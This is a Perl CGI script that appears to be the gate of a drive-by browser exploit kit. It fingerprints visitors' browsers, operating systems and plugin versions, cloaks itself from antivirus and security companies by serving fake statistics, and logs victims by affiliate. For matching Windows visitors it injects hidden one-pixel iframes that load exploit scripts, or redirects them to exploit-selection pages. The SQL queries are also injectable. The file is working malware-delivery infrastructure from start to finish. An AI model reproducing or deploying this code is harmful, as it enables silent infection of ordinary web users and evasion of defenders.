#!/usr/bin/perl

#  
# Check the client information and send exploits
#

use CGI;
use Geo::IP;
use DBI;
require "lib/JsXOR.pm";
require "lib/GenFunc.pm";
require "lib/Xploit.pm";
require "config.pl";

$q = new CGI;

$aff = $q->param('aff');
$referer = $q->param('referer');

#get plugin versions
$javaver = $q->param('java');
$adobever = $q->param('adobe');
$quicktimever = $q->param('quicktime');
$flashver = $q->param('flash');
$shockwavever = $q->param('shockwave');
$vlcver = $q->param('vlc');
$realplayerver = $q->param('realversion');

$aff = 'admin' if($aff eq "");
$real_ipadd = $ENV{REMOTE_ADDR};
$gi = Geo::IP->open( 'dep/GeoIPOrg.dat' );
$org_chk = $gi->org_by_addr($real_ipadd);
$org_chk =~ tr/[A-Z]/[a-z]/;
$gi = Geo::IP->open( 'dep/GeoIP.dat' );
$country = $gi->country_code_by_addr($real_ipadd);


########### Basic Protections ############

#Connect to database
$db_name = 'DBI:mysql:' . $config{MysqlDB};
$dbh = DBI->connect($db_name, $config{MysqlUser}, $config{MysqlPass}) || die "Could not connect to database: $DBI::errstr";


$req = "SELECT antivp,city,blankcheck,windowsonly,username FROM affiliates WHERE affid='$aff'";
$sth = $dbh->prepare($req);
$sth->execute() || die;
while(my @row = $sth->fetchrow_array)
{
  $antivporgcheck = $row['0'];
  $allcountrieslist = $row['1'];
  $blockedrefblankchk = $row['2'];
  $blockedrefwindowschk = $row['3'];
  $username = $row['4'];
}
$sth -> finish;

#Block known antivirus from quering
#$antivporgcheck = $dbh->selectrow_array("SELECT antivp FROM affiliates WHERE affid='$aff'");

############# Advanced protections ##############
#$allcountrieslist = $dbh->selectrow_array("SELECT city FROM affiliates WHERE affid='$aff'");
#$blockedrefblankchk = $dbh->selectrow_array("SELECT blankcheck FROM affiliates WHERE affid='$aff'");
#$blockedrefwindowschk = $dbh->selectrow_array("SELECT windowsonly FROM affiliates WHERE affid='$aff'");

#get username from affid for exploits_enabled
#$username = $dbh->selectrow_array("SELECT username FROM affiliates WHERE affid='$aff'");

$antivpblockcheck = 0;
if($antivporgcheck eq 'yes')
{
  $antivpblockcheck = 1 if($org_chk =~ 'google');
  $antivpblockcheck = 1 if($org_chk =~ 'trend micro');
  $antivpblockcheck = 1 if($org_chk =~ 'kaspersky');
  $antivpblockcheck = 1 if($org_chk =~ 'avast');
  $antivpblockcheck = 1 if($org_chk =~ 'av-test');
  $antivpblockcheck = 1 if($org_chk =~ 'eset');
  $antivpblockcheck = 1 if($org_chk =~ 'sonicwall');
  $antivpblockcheck = 1 if($org_chk =~ 'microsoft');
  $antivpblockcheck = 1 if($org_chk =~ 'vnet s. r. o.');
  $antivpblockcheck = 1 if($org_chk =~ 'kindsight');
  $antivpblockcheck = 1 if($org_chk =~ 'websense');
  $antivpblockcheck = 1 if($org_chk =~ 'theplanet.com');
  $antivpblockcheck = 1 if($org_chk =~ 'level 3 communications');
}

if($antivpblockcheck eq '1')
{
  fakestats();
  die;
}
else
{
  $doubleip = 0;
  $useragent = $ENV{HTTP_USER_AGENT};
  $useragent =~ tr/[A-Z]/[a-z]/;

  $accepted_language = $ENV{HTTP_ACCEPT_LANGUAGE};
  $accepted_language =~ tr/[A-Z]/[a-z]/;
  
  #Convert IP
  my (@octets,$octet,$ip_number,$number_convert,$ip_address);
  $ip_address = $real_ipadd;
  chomp ($ip_address);
  @octets = split(/\./, $ip_address);
  $ip_number = 0;
  foreach $octet (@octets) {
  $ip_number <<= 8;
  $ip_number |= $octet;
  }

  #get all client informations
  $os = GenFunc::getos($useragent);
  $flavor = GenFunc::getflavor($useragent);
  $sp = GenFunc::getsp($useragent);
  $lang = GenFunc::getlang($accepted_language);
  $uaname = GenFunc::getuaname($useragent);
  $uaver = GenFunc::getuaver($uaname);
  $arch = GenFunc::getarch($useragent);

  #arrange vars for not double them
  #$uaname = 'MSIE' if($uaname =~ "msie");
  #$os = 'Windows' if($os =~ "windows");
  #$flavor = 'Vista' if($os =~ "vista");
  #$uaname = 'Firefox' if($uaname =~ "firefox");
  #$flavor = 'XP' if($flavor =~ "xp");
  #$flavor = 'XP' if($flavor =~ "Xp");
  
  $runcity = 0;
  my @valuescities = split(',', $allcountrieslist);

  #blacklisted city check
  foreach my $valcit (@valuescities) {
    $runcity = 1 if($valcit eq $country);
    $runcity = 1 if($valcit eq 'ALL');
    $runcity = 0 if($valcit eq 'NONE');
  }

  #Check for blank referer
  $referer = 'BLANK' if($referer eq '');
  if($referer =~ 'BLANK' and $blockedrefblankchk eq 'yes')
  {
    $runcity = 0;
  }

  #Check if it's a windows
  if($os ne 'Windows' and $blockedrefwindowschk eq 'yes')
  {
    $runcity = 0;
  }

  if($runcity eq "0")
  {
    #dump fake stats to emulate a statscounter
    fakestats();
    die;
  }
  else
  {
    ############# Anti-Multi Client Protection ############
    $verifdoubleipch = $dbh->selectrow_array("SELECT os FROM hosts WHERE ip='$ip_number'");
    if($verifdoubleipch eq "")
    {
      #Insert the system stats and check if the IP already exist
      $sql = "INSERT hosts (ip, browser, browser_version, os, os_flavor, service_pack, os_lang, country, arch, referer, aff, java, adobe, quicktime, flash, shockwave, vlc, realplayer) VALUES ('$ip_number', '$uaname', '$uaver', '$os', '$flavor', '$sp', '$lang', '$country', '$arch', '$referer', '$aff', '$javaver', '$adobever', '$quicktimever', '$flashver', '$shockwavever', '$vlcver', '$realplayerver')";
      $statement = $dbh->prepare($sql);
      $statement->execute() or $doubleip = 1;
    }
    else
    {
      $doubleip = 1;
    }

    if($doubleip eq 1)
    {
      fakestats();
      die;
    }
    else
    {
      ############# Serve Exploits ############

      #generate random cookie name + value
      $randcookiename = JsXOR::generate_random_string(10);
      #$randcookievalue5 = JsXOR::generate_random_number(int(rand(20)));
      $cookiexpl = $q->cookie(-name=>$randcookiename,
			 -value=>'111111111111111111',
			 #-expires=>'+3m', #wasn't working on some server (cannot expire)
			 -path=>'/');

      #Check the mode currently enabled and %age random
      $req = "SELECT mode,percent_rand FROM options WHERE username='$username'";
      $sth = $dbh->prepare($req);
      $sth->execute() || die;
      while(my @row = $sth->fetchrow_array)
      {
        $xpmode = $row['0'];
        $randompercentai = $row['1'];
      }
      $sth -> finish;

      #define exploit to print
      print $q->header(
                   -p3p => 'IDC DSP COR ADM DEVi TAIi PSA PSD IVAi IVDi CONi HIS OUR IND CNT',
                   -cookie => $cookiexpl
                   );
      print '<html>' . "\n";
      print '<head>' . "\n";
      if($xpmode eq 'rand')
      {
        $randomprint = randommodeval();
        print $randomprint . "\n";
      }
      if($xpmode eq 'ai')
      {
        $aiprint = aiprinteval();
        print $aiprint . "\n";
      }
      if($xpmode eq 'hybrid')
      {
        $hybridprint = hybridprinteval();
        print $hybridprint . "\n";
      }
      print '</head>' . "\n";
      print '<body>' . "\n";
      aggressive() if($xpmode eq 'aggr');
  
      print '</body>' . "\n";
      print '</html>' . "\n";
    }
  }
}


sub fakestats
{
  print $q->header();
  open(FILE2,"<dep/fakestats.js");
  while(<FILE2>)
  {
    $fakestats .= $_;
  }
  close(FILE2);
  print "$fakestats";
}

sub aggressive
{
  if($os eq 'Windows')
  {
    $plug_in_all .= 'Java:' if($javaver ne 'null');
    $plug_in_all .= 'Adobe:' if($adobever ne 'null');
    $plug_in_all .= 'Quicktime:' if($quicktimever ne 'null');
    $plug_in_all .= 'Flash:' if($flashver ne 'null');
    $plug_in_all .= 'Shockwave:' if($shockwavever ne 'null');
    $plug_in_all .= 'Vlc:' if($vlcver ne 'null');
    $plug_in_all .= 'Realplayer:' if($realplayerver ne 'null');

  #begin experimental exploit get
  @exploitslinevar = Xploit::allsploit();
  foreach(@exploitslinevar)
  {
    $runmexplty = $_;
    $exploitnowconfig = Xploit::xplconf($runmexplty);
    @valueexploitnow = split(/:/, $exploitnowconfig);
    
    $uaname_chk2 = "";
    @uanameddf = split(/,/, $valueexploitnow[0]);
    foreach(@uanameddf)
    {
      $uaname_chk2 = 'ok' if($_ eq 'ALL');
      $uaname_chk2 = 'ok' if($uaname =~ $_);
    }

    $uaver_chk2 = "";
    @uaverddf = split(/,/, $valueexploitnow[1]);
    foreach(@uaverddf)
    {
      $uaver_chk2 = 'ok' if($_ eq 'ALL');
      $uaver_chk2 = 'ok' if($uaver =~ $_);
    }

    $fla_chk2 = "";
    @fladdf = split(/,/, $valueexploitnow[2]);
    foreach(@fladdf)
    {
      $fla_chk2 = 'ok' if($_ eq 'ALL');
      $fla_chk2 = 'ok' if($flavor =~ $_);
    }

    $plugin_chk2 = $valueexploitnow[3];
    $plugin_chk2 = $plug_in_all if($valueexploitnow[3] eq 'NA');

    if($fla_chk2 eq 'ok' and $uaname_chk2 eq 'ok' and $uaver_chk2 eq 'ok' and $plug_in_all =~ $plugin_chk2)
    {
      if($valueexploitnow[4] eq 'NA')
      {
        xplvalidornot($runmexplty);
      }
      else
      {
        if($valueexploitnow[3] eq 'Java')
        {
          @valuejavanow = split(/,/, $valueexploitnow[4]);
          foreach(@valuejavanow)
          {
            if($javaver =~ $_)
            {
              xplvalidornot($runmexplty);
            }
          }
        }
        if($valueexploitnow[3] eq 'Adobe')
        {
          @valueadobenow = split(/,/, $valueexploitnow[4]);
          foreach(@valueadobenow)
          {
            if($adobever =~ $_)
            {
              xplvalidornot($runmexplty);
            }
          }
        }
        if($valueexploitnow[3] eq 'Quicktime')
        {
          @valuequicktimenow = split(/,/, $valueexploitnow[4]);
          foreach(@valuequicktimenow)
          {
            if($quicktimever =~ $_)
            {
              xplvalidornot($runmexplty);
            }
          }
        }
        if($valueexploitnow[3] eq 'Flash')
        {
          @valueflashnow = split(/,/, $valueexploitnow[4]);
          foreach(@valueflashnow)
          {
            if($flashver =~ $_)
            {
              xplvalidornot($runmexplty);
            }
          }
        }
        if($valueexploitnow[3] eq 'Shockwave')
        {
          @valueshockwavenow = split(/,/, $valueexploitnow[4]);
          foreach(@valueshockwavenow)
          {
            if($shockwavever =~ $_)
            {
              xplvalidornot($runmexplty);
            }
          }
        }
        if($valueexploitnow[3] eq 'Vlc')
        {
          @valuevlcnow = split(/,/, $valueexploitnow[4]);
          foreach(@valuevlcnow)
          {
            if($vlcver =~ $_)
            {
              xplvalidornot($runmexplty);
            }
          }
        }
        if($valueexploitnow[3] eq 'Realplayer')
        {
          @valuerealplayernow = split(/,/, $valueexploitnow[4]);
          foreach(@valuerealplayernow)
          {
            if($realplayerver =~ $_)
            {
              xplvalidornot($runmexplty);
            }
          }
        }

      }
    }
  }    
 }
}

sub xplvalidornot
{
  $runmexplty = shift;

  $a1chk = $dbh->selectrow_array("SELECT $runmexplty FROM exploits_enabled WHERE username='$username'");
  if($a1chk =~ 'on')
  {
    print '<iframe src="exploits/' . $runmexplty . '.pl?aff=' . $aff . '&csname=' . $randcookiename . '&flavor=' . $flavor . '"  marginwidth="1px" align="center" frameborder="0" height="1" scrolling="no" width="1"></iframe>';
  }
}

sub randommodeval
{
  $metarefreshrand = '<meta http-equiv="Refresh" content="0; url=rand.pl?' . "csname=$randcookiename&aff=$aff&run=0&os=$os&flavor=$flavor&sp=$sp&lang=$lang&uaname=$uaname&uaver=$uaver&arch=$arch&ip=$ip_number" . '" />';
  return $metarefreshrand;
}

sub aiprinteval
{
  #Redirect to AI or Random
  my $random_number_ai = int(rand(100));
  if($random_number_ai < $randompercentai)
  {
    $metarefreshrandai = '<meta http-equiv="Refresh" content="0; url=rand.pl?' . 'csname=' . $randcookiename . '&aff=' . $aff . '&run=0&os=' . $os . '&flavor=' . $flavor . '&sp=' . $sp . '&lang=' . $lang . '&uaname=' . $uaname . '&uaver=' . $uaver . '&arch=' . $arch . '&ip=' . $ip_number . '" />';
  }
  else
  {
    $metarefreshrandai = '<meta http-equiv="Refresh" content="0; url=ai.pl?' . 'csname=' . $randcookiename . '&aff=' . $aff . '&run=0&os=' . $os . '&flavor=' . $flavor . '&sp=' . $sp . '&lang=' . $lang . '&uaname=' . $uaname . '&uaver=' . $uaver . '&arch=' . $arch . '&ip=' . $ip_number . '" />';

  }
  return $metarefreshrandai;
}

sub hybridprinteval
{
  
  #Redirect to AI or Random
  my $random_number_ai = int(rand(100));
  if($random_number_ai < $randompercentai)
  {
    $metarefreshrandai = '<meta http-equiv="Refresh" content="0; url=rand.pl?' . 'csname=' . $randcookiename . '&aff=' . $aff . '&run=0&os=' . $os . '&flavor=' . $flavor . '&sp=' . $sp . '&lang=' . $lang . '&uaname=' . $uaname . '&uaver=' . $uaver . '&arch=' . $arch . '&ip=' . $ip_number . '" />';
  }
  else
  {
    $metarefreshrandai = '<meta http-equiv="Refresh" content="0; url=hybrid.pl?' . 'csname=' . $randcookiename . '&aff=' . $aff . '&run=0&os=' . $os . '&flavor=' . $flavor . '&sp=' . $sp . '&lang=' . $lang . '&uaname=' . $uaname . '&uaver=' . $uaver . '&arch=' . $arch . '&ip=' . $ip_number . '" />';

  }
  return $metarefreshrandai;
}

$dbh->disconnect();

1;
